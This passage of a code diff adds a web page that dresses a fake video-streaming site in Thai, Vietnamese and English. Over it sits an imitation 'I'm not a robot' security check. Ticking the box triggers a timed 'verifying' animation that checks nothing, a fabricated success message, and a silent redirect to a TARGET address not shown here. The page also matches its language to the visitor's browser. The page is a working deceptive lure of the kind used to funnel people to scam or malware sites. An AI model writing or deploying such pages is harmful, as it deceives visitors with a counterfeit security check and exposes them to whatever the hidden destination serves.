+            ['ข่าวเด็ดประจำวัน', 'ข่าวไวรัล · 2.3 ล้านวิว', '06:45', 'NEWS']
+          ],
+          card: {
+            title: 'การยืนยันความปลอดภัย',
+            desc: 'กรุณายืนยันเพื่อดำเนินการต่อ',
+            label: 'ฉันไม่ใช่หุ่นยนต์',
+            brandTop: 'ยืนยัน',
+            brandSub: 'ตรวจสอบความปลอดภัย',
+            init: 'ทำเครื่องหมายในช่องด้านบนเพื่อดำเนินการต่อ',
+            verifying: 'กำลังยืนยัน...',
+            success: 'ยืนยันสำเร็จ กำลังเปลี่ยนเส้นทาง...'
+          }
+        },
+
+        /* ---------------- VIETNAMESE ---------------- */
+        vi: {
+          label: 'VI',
+          brand: ['VIET', 'STREAM'],
+          nav: ['Trang chủ', 'Xu hướng', 'Trực tiếp', 'Danh mục'],
+          heroBadge: 'LIVE NOW',
+          heroTitle: 'Đại nhạc hội tối nay',
+          heroMeta: '🇻🇳 Tự hào Việt Nam · 250k người xem · Xu hướng #1',
+          heroBtn: '▶ Xem ngay',
+          videos: [
+            ['Đại nhạc hội trực tiếp', 'Nhạc Việt · 45k đang xem', '12:34', 'LIVE'],
+            ['Tổng hợp clip hài hước', 'Hài Việt · 2,1Tr lượt xem', '08:12', '🔥 #1', true],
+            ['Mukbang phở khổng lồ', 'Ẩm thực Việt · 890k lượt xem', '15:20', 'MỚI'],
+            ['Viral! Cậu bé khiến triệu người xúc động', 'Tin viral · 5,2Tr lượt xem', '07:45', '🔥 #3', true],
+            ['Đánh giá điện thoại giá rẻ', 'Công nghệ Việt · 1,4Tr lượt xem', '22:10'],
+            ['Nhạc bolero remix 2024', 'Nhạc Việt · 12Tr lượt xem', '1:02:11'],
+            ['Ăn vặt phố cổ Hà Nội', 'Ẩm thực đường phố · 3,4Tr lượt xem', '18:04', 'VLOG'],
+            ['Dân ca quan họ', 'Văn hóa Việt · 2,8Tr lượt xem', '10:30'],
+            ['Vlog leo Fansipan', 'Du lịch Việt · 1,1Tr lượt xem', '25:18', '4K'],
+            ['Hài độc thoại Việt Nam', 'Hài Việt · 4,5Tr lượt xem', '14:44'],
+            ['Nhạc TikTok viral', 'Xu hướng Việt · 15Tr lượt xem', '55:22', '🔥 #2', true],
+            ['Cách nấu phở bò chuẩn vị', 'Bếp Việt · 6,2Tr lượt xem', '09:15'],
+            ['Du lịch Đà Lạt mùa hoa', 'Du lịch Việt · 2,3Tr lượt xem', '32:08', '🔥 #4', true],
+            ['Phim truyền hình Việt', 'Giải trí Việt · 450k lượt xem', '2:14:30'],
+            ['Tin tức hôm nay', 'Tin viral · 2,3Tr lượt xem', '06:45', 'NEWS']
+          ],
+          card: {
+            title: 'Xác minh bảo mật',
+            desc: 'Vui lòng xác minh để tiếp tục.',
+            label: 'Tôi không phải là robot',
+            brandTop: 'Xác minh',
+            brandSub: 'Kiểm tra bảo mật',
+            init: 'Đánh dấu vào ô bên trên để tiếp tục.',
+            verifying: 'Đang xác minh...',
+            success: 'Xác minh thành công. Đang chuyển hướng...'
+          }
+        },
+
+        /* ---------------- ENGLISH ---------------- */
+        en: {
+          label: 'EN',
+          brand: ['GLOBAL', 'STREAM'],
+          nav: ['Home', 'Trending', 'Live', 'Categories'],
+          heroBadge: 'LIVE NOW',
+          heroTitle: "Tonight's Big Live Concert",
+          heroMeta: '🌏 Worldwide · 250k viewers · Trending #1',
+          heroBtn: '▶ Watch Now',
+          videos: [
+            ['Live Concert From Jakarta', 'Pop Live · 45k watching', '12:34', 'LIVE'],
+            ['Funniest Prank Compilation', 'Local Comedy · 2.1M views', '08:12', '🔥 #1', true],
+            ['Epic Mukbang Challenge', 'Food Channel · 890k views', '15:20', 'NEW'],
+            ['Viral! Student Speech Moves Millions', 'Viral News · 5.2M views', '07:45', '🔥 #3', true],
+            ['Budget Phone Review 2024', 'Tech Daily · 1.4M views', '22:10'],
+            ['Acoustic Hits Playlist 2024', 'Music Channel · 12M views', '1:02:11'],
+            ['Street Food Tour Downtown', 'Street Eats · 3.4M views', '18:04', 'VLOG'],
+            ['Traditional Folk Songs', 'Our Culture · 2.8M views', '10:30'],
+            ['Sunrise Mountain Hike Vlog', 'Travel Channel · 1.1M views', '25:18', '4K'],
+            ['Stand Up Comedy Full Show', 'Local Comedy · 4.5M views', '14:44'],
+            ['TikTok Viral Hits', 'Trending Global · 15M views', '55:22', '🔥 #2', true],
+            ['Easy Home Cooking Recipes', 'Home Kitchen · 6.2M views', '09:15'],
+            ['Autumn City Walk 4K', 'Travel Channel · 2.3M views', '32:08', '🔥 #4', true],
+            ['Classic Movie Full Episode', 'Movie Channel · 450k views', '2:14:30'],
+            ["Today's Top News", 'Viral News · 2.3M views', '06:45', 'NEWS']
+          ],
+          card: {
+            title: 'Security Verification',
+            desc: 'Please verify to continue.',
+            label: "I'm not a robot",
+            brandTop: 'Verify',
+            brandSub: 'Security Check',
+            init: 'Check the box above to continue.',
+            verifying: 'Verifying...',
+            success: 'Verification successful. Redirecting...'
+          }
+        }
+      };
+
+      const LANGS = ['id', 'ms', 'tl', 'ja', 'th', 'vi', 'en'];
+
+      // ============================================================
+      // ELEMEN
+      // ============================================================
+      const $ = (id) => document.getElementById(id);
+
+      const el = {
+        brandA: $('brandA'),
+        brandB: $('brandB'),
+        navLinks: $('navLinks'),
+        heroBadge: $('heroBadge'),
+        heroTitle: $('heroTitle'),
+        heroMeta: $('heroMeta'),
+        heroBtn: $('heroBtn'),
+        bgBody: $('bgBody'),
+        title: $('title'),
+        desc: $('desc'),
+        labelText: $('labelText'),
+        brandTop: $('brandTop'),
+        brandSub: $('brandSub'),
+        status: $('status'),
+        challenge: $('challenge'),
+        checkbox: $('cb'),
+        langBar: $('langBar')
+      };
+
+      let processing = false;
+      let timers = [];
+      let currentLang = null;
+
+      // ============================================================
+      // DETEKSI BAHASA
+      // ============================================================
+      function detectLang() {
+        const q = new URLSearchParams(location.search).get('lang');
+        if (q && I18N[q]) return q;
+
+        try {
+          const saved = localStorage.getItem(LANG_KEY);
+          if (saved && I18N[saved]) return saved;
+        } catch (e) { /* ignore */ }
+
+        const raw = (navigator.languages && navigator.languages[0])
+                  || navigator.language || 'id';
+        const l = String(raw).toLowerCase();
+
+        if (l.startsWith('ms'))                          return 'ms';
+        if (l.startsWith('tl') || l.startsWith('fil'))   return 'tl';
+        if (l.startsWith('ja'))                          return 'ja';
+        if (l.startsWith('th'))                          return 'th';
+        if (l.startsWith('vi'))                          return 'vi';
+        if (l.startsWith('en'))                          return 'en';
+        if (l.startsWith('id') || l.startsWith('in'))    return 'id';
+
+        return 'id';
+      }
+
+      // ============================================================
+      // RENDER KARTU VIDEO BACKGROUND
+      // ============================================================
+      function renderVideos(videos) {
+        let html = '';
+
+        for (let i = 0; i < videos.length; i += 5) {
+          const chunk = videos.slice(i, i + 5);
+          html += '<div class="bg-row">';
+
+          chunk.forEach((v) => {
+            const t = v[0], m = v[1], d = v[2], badge = v[3], trend = v[4];
+            const badgeHtml = badge
+              ? '<span class="bg-badge' + (trend ? ' trend' : '') + '">' + badge + '</span>'
+              : '';
+
+            html +=
+              '<div class="bg-card">' +
+                '<div class="bg-thumb">' +
+                  badgeHtml +
+                  '<span class="bg-dur">' + d + '</span>' +
+                '</div>' +
+                '<div class="bg-meta">' +
+                  '<div class="bg-t">' + t + '</div>' +
+                  '<div class="bg-m">' + m + '</div>' +
+                '</div>' +
+              '</div>';
+          });
+
+          html += '</div>';
+        }
+
+        el.bgBody.innerHTML = html;
+      }
+
+      // ============================================================
+      // RENDER PEMILIH BAHASA
+      // ============================================================
+      function buildLangBar() {
+        el.langBar.innerHTML = LANGS.map((code) =>
+          '<button type="button" data-lang="' + code + '" aria-pressed="false">' +
+            I18N[code].label +
+          '</button>'
+        ).join('');
+
+        el.langBar.addEventListener('click', (e) => {
+          const btn = e.target.closest('button[data-lang]');
+          if (!btn) return;
+          const code = btn.getAttribute('data-lang');
+          if (code && I18N[code]) applyLang(code, true);
+        });
+      }
+
+      // ============================================================
+      // RESET STATE VERIFIKASI
+      // ============================================================
+      function resetChallenge() {
+        timers.forEach(clearTimeout);
+        timers = [];
+        processing = false;
+
+        el.checkbox.checked = false;
+        el.checkbox.disabled = false;
+        el.challenge.classList.remove('is-checked', 'is-verifying', 'is-success');
+      }
+
+      // ============================================================
+      // TERAPKAN BAHASA
+      // ============================================================
+      function applyLang(code, persist) {
+        const t = I18N[code] || I18N.id;
+        currentLang = I18N[code] ? code : 'id';
+
+        document.documentElement.lang = currentLang;
+        document.title = t.card.title;
+
+        if (persist) {
+          try { localStorage.setItem(LANG_KEY, currentLang); } catch (e) { /* ignore */ }
+        }
+
+        // Background
+        el.brandA.textContent = t.brand[0];
+        el.brandB.textContent = t.brand[1];
+
+        el.navLinks.innerHTML = t.nav.map((n, i) =>
+          '<span class="' + (i === 0 ? 'active' : '') + '">' + n + '</span>'
+        ).join('');
+
+        el.heroBadge.textContent = t.heroBadge;
+        el.heroTitle.textContent = t.heroTitle;
+        el.heroMeta.textContent  = t.heroMeta;
+        el.heroBtn.textContent   = t.heroBtn;
+
+        renderVideos(t.videos);
+
+        // Kartu
+        resetChallenge();
+        el.title.textContent     = t.card.title;
+        el.desc.textContent      = t.card.desc;
+        el.labelText.textContent = t.card.label;
+        el.brandTop.textContent  = t.card.brandTop;
+        el.brandSub.textContent  = t.card.brandSub;
+        el.status.className      = 'status';
+        el.status.textContent    = t.card.init;
+
+        // Tombol bahasa
+        Array.prototype.forEach.call(
+          el.langBar.querySelectorAll('button[data-lang]'),
+          (btn) => btn.setAttribute(
+            'aria-pressed',
+            btn.getAttribute('data-lang') === currentLang ? 'true' : 'false'
+          )
+        );
+      }
+
+      // ============================================================
+      // ALUR: centang -> verifying -> success -> redirect
+      // ============================================================
+      el.checkbox.addEventListener('change', () => {
+        if (!el.checkbox.checked || processing) return;
+
+        const t = I18N[currentLang] || I18N.id;
+
+        processing = true;
+        el.checkbox.disabled = true;
+
+        el.challenge.classList.add('is-checked');
+        el.status.className = 'status';
+        el.status.textContent = t.card.verifying;
+
+        timers.push(setTimeout(() => {
+          el.challenge.classList.remove('is-checked');
+          el.challenge.classList.add('is-verifying');
+        }, TICK_MS));
+
+        timers.push(setTimeout(() => {
+          el.challenge.classList.remove('is-verifying');
+          el.challenge.classList.add('is-success');
+          el.status.className = 'status success';
+          el.status.textContent = t.card.success;
+        }, TICK_MS + VERIFY_MS));
+
+        timers.push(setTimeout(() => {
+          window.location.replace(TARGET);
+        }, TICK_MS + VERIFY_MS + SUCCESS_MS));
+      });
+
+      // ============================================================
+      // INIT
+      // ============================================================
+      buildLangBar();
+      applyLang(detectLang(), false);
+
+    })();
+  </script>
+</body>
+</html>
